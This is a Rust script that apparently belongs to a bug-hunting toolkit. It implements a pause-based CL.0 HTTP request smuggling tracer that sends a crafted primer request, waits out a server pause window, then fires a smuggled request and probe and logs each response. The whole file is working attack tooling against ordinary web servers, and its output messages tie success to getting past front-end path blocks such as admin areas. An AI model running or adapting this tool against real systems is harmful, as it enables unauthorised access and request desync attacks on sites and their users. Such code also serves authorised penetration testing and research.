#!/usr/bin/env rust-script
//! name: pause_trace
//! description: Pause-based CL.0 desync tracer - send a caller-crafted primer (with {CL}/{HOST} tokens), hold or drain the pause window while recording whatever the front-end returns, then send the smuggled request (optionally on a fresh connection with --reconnect) and read every response with per-stage timing, so the exact pause-based desync sequencing is observable in one envelope instead of guessed.
//! version: 1.0.0
//! args: <url> --primer 'RAW' [--smuggle 'RAW'] [--pause-ms N] [--drain] [--reconnect] [--read-ms N] [--probe 'RAW'] [--probe-wait-ms N] [--out FILE] [--selftest]
//! keywords: 漏洞猎手套件, smuggling, desync, pause, cl0, tracer, apache, admin
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::io::{ErrorKind, Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

const SLICE_MS: u64 = 3000;

trait ReadWrite: Read + Write {}
impl<T: Read + Write> ReadWrite for T {}

fn unescape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut it = s.chars();
    while let Some(c) = it.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match it.next() {
            Some('r') => out.push('\r'),
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some('0') => out.push('\0'),
            Some('\\') => out.push('\\'),
            Some(other) => out.push(other),
            None => out.push('\\'),
        }
    }
    out
}

fn connect(host: &str, port: u16, tls: bool) -> Result<Box<dyn ReadWrite>, String> {
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect {host}:{port}: {e}"))?;
    let _ = tcp.set_read_timeout(Some(Duration::from_millis(SLICE_MS)));
    let _ = tcp.set_write_timeout(Some(Duration::from_secs(10)));
    if tls {
        let mut roots = rustls::RootCertStore::empty();
        roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
        let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
        let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
        let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls init: {e}"))?;
        Ok(Box::new(rustls::StreamOwned::new(conn, tcp)))
    } else {
        Ok(Box::new(tcp))
    }
}

/// Read until the whole `window_ms` has elapsed (or EOF), collecting everything.
fn read_window<S: Read>(s: &mut S, window_ms: u64) -> (Vec<u8>, bool) {
    let mut out: Vec<u8> = Vec::new();
    let mut buf = [0u8; 16384];
    let start = Instant::now();
    loop {
        match s.read(&mut buf) {
            Ok(0) => return (out, true),
            Ok(n) => out.extend_from_slice(&buf[..n]),
            Err(e) if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut => {
                if start.elapsed() >= Duration::from_millis(window_ms) {
                    return (out, false);
                }
            }
            Err(_) => return (out, true),
        }
        if start.elapsed() >= Duration::from_millis(window_ms) {
            return (out, false);
        }
    }
}

/// Read until `settle_ms` of idleness after the first data, or `window_ms` overall.
fn read_settle<S: Read>(s: &mut S, window_ms: u64, settle_ms: u64) -> (Vec<u8>, bool) {
    let mut out: Vec<u8> = Vec::new();
    let mut buf = [0u8; 16384];
    let start = Instant::now();
    let mut last = start;
    loop {
        match s.read(&mut buf) {
            Ok(0) => return (out, true),
            Ok(n) => {
                out.extend_from_slice(&buf[..n]);
                last = Instant::now();
            }
            Err(e) if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut => {
                if !out.is_empty() && last.elapsed() >= Duration::from_millis(settle_ms) {
                    return (out, false);
                }
                if start.elapsed() >= Duration::from_millis(window_ms) {
                    return (out, false);
                }
            }
            Err(_) => return (out, true),
        }
    }
}

fn status_line(bytes: &[u8]) -> String {
    let text = String::from_utf8_lossy(bytes);
    match text.split("\r\n").find(|l| l.starts_with("HTTP/")) {
        Some(l) => l.trim().to_string(),
        None => format!("<{} bytes, no status line>", bytes.len()),
    }
}

fn stage_row(name: &str, raw: &[u8], elapsed_ms: u128, eof: bool, preview: usize) -> Value {
    json!({
        "stage": name,
        "bytes": raw.len(),
        "elapsed_ms": elapsed_ms as u64,
        "status_line": status_line(raw),
        "eof": eof,
        "raw_preview": String::from_utf8_lossy(raw).chars().take(preview).collect::<String>(),
    })
}

fn render(tpl: &str, host: &str, cl: usize) -> String {
    unescape(tpl).replace("{HOST}", host).replace("{CL}", &cl.to_string())
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let r = render("POST / HTTP/1.1\\r\\nHost: {HOST}\\r\\nContent-Length: {CL}\\r\\n\\r\\n", "h.example", 7);
        let ok = r.contains("Host: h.example") && r.contains("Content-Length: 7") && status_line(b"HTTP/1.1 200 OK\r\n\r\n").starts_with("HTTP/1.1 200");
        pi_rust_lib::report::success("pause_trace", json!({"selftest": if ok { "ok" } else { "fail" }, "rendered": r}),
            "tokens and status-line extraction are the tracer's roots").unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut url = String::new();
    let mut primer = String::new();
    let mut smuggle: Option<String> = None;
    let mut probe: Option<String> = None;
    let mut pause_ms: u64 = 120_000;
    let mut read_ms: u64 = 10_000;
    let mut probe_wait_ms: u64 = 1_000;
    let mut drain = false;
    let mut reconnect = false;
    let mut out: Option<String> = None;
    let mut preview: usize = 900;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--primer" => { i += 1; if let Some(v) = args.get(i) { primer = v.clone(); } }
            "--smuggle" => { i += 1; if let Some(v) = args.get(i) { smuggle = Some(v.clone()); } }
            "--probe" => { i += 1; if let Some(v) = args.get(i) { probe = Some(v.clone()); } }
            "--pause-ms" => { i += 1; pause_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(pause_ms); }
            "--read-ms" => { i += 1; read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms); }
            "--probe-wait-ms" => { i += 1; probe_wait_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(probe_wait_ms); }
            "--preview" => { i += 1; preview = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(preview); }
            "--drain" => drain = true,
            "--reconnect" => reconnect = true,
            "--out" => { i += 1; if let Some(v) = args.get(i) { out = Some(v.clone()); } }
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if url.is_empty() || primer.is_empty() {
        pi_rust_lib::report::failure("pause_trace", "usage", "pause_trace <url> --primer 'RAW with {CL}/{HOST}' [--smuggle 'RAW'] [--pause-ms N] [--drain] [--reconnect]");
        std::process::exit(2);
    }

    let parsed = Url::parse(&url).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port().unwrap_or(if parsed.scheme() == "https" { 443 } else { 80 });
    let tls = parsed.scheme() == "https";

    match run(&host, port, tls, &primer, &smuggle, &probe, pause_ms, read_ms, probe_wait_ms, drain, reconnect, preview, &out) {
        Ok(v) => pi_rust_lib::report::success("pause_trace", v, "a smuggled status line after the pause stage is the desync; 403 Path blocked means the front-end parsed it").unwrap_or(()),
        Err(e) => { pi_rust_lib::report::failure("pause_trace", &e, "check host/port and the primer literal"); std::process::exit(1); }
    }
}

#[allow(clippy::too_many_arguments)]
fn run(host: &str, port: u16, tls: bool, primer_tpl: &str, smuggle: &Option<String>, probe: &Option<String>,
       pause_ms: u64, read_ms: u64, probe_wait_ms: u64, drain: bool, reconnect: bool, preview: usize, out: &Option<String>) -> Result<Value, String> {
    let mut all: Vec<u8> = Vec::new();
    let mut stages: Vec<Value> = Vec::new();

    let smuggle_str = smuggle.as_ref().map(|s| unescape(s)).unwrap_or_default();
    let primer = render(primer_tpl, host, smuggle_str.len());
    let smuggle_rendered = if reconnect { render(smuggle.as_deref().unwrap_or(""), host, 0) } else { render(smuggle.as_deref().unwrap_or(""), host, 0) };

    let mut stream = connect(host, port, tls)?;

    // Stage 1: primer
    stream.write_all(primer.as_bytes()).map_err(|e| format!("send primer: {e}"))?;
    let _ = stream.flush();
    stages.push(json!({"stage": "primer", "bytes": primer.len(), "sent": primer.chars().take(preview).collect::<String>()}));

    // Stage 2: the pause window
    let t1 = Instant::now();
    if drain {
        let (raw, eof) = read_window(&mut stream, pause_ms);
        all.extend_from_slice(&raw);
        stages.push(stage_row("pause_drain", &raw, t1.elapsed().as_millis(), eof, preview));
    } else {
        std::thread::sleep(Duration::from_millis(pause_ms));
        stages.push(stage_row("pause_silent", &[], pause_ms as u128, false, 0));
    }

    // Stage 3: the smuggled request
    if !smuggle_rendered.is_empty() {
        if reconnect {
            stream = connect(host, port, tls)?;
            stages.push(json!({"stage": "reconnect", "bytes": 0}));
        }
        let t2 = Instant::now();
        stream.write_all(smuggle_rendered.as_bytes()).map_err(|e| format!("send smuggle: {e}"))?;
        let _ = stream.flush();
        let (raw, eof) = read_settle(&mut stream, read_ms, 900);
        all.extend_from_slice(&raw);
        stages.push(stage_row("smuggle_response", &raw, t2.elapsed().as_millis(), eof, preview));
    }

    // Stage 4: follow-up probe
    if let Some(p) = probe {
        std::thread::sleep(Duration::from_millis(probe_wait_ms));
        let p = render(p, host, 0);
        let t3 = Instant::now();
        stream.write_all(p.as_bytes()).map_err(|e| format!("send probe: {e}"))?;
        let _ = stream.flush();
        let (raw, eof) = read_settle(&mut stream, read_ms, 900);
        all.extend_from_slice(&raw);
        stages.push(stage_row("probe_response", &raw, t3.elapsed().as_millis(), eof, preview));
    }

    if let Some(p) = out {
        let _ = std::fs::write(p, &all);
    }

    Ok(json!({
        "url": format!("{}://{}", if tls { "https" } else { "http" }, host),
        "primer_len": primer.len(),
        "smuggle_len": smuggle_rendered.len(),
        "reconnect": reconnect,
        "drain": drain,
        "pause_ms": pause_ms,
        "stages": stages,
        "total_bytes": all.len(),
    }))
}
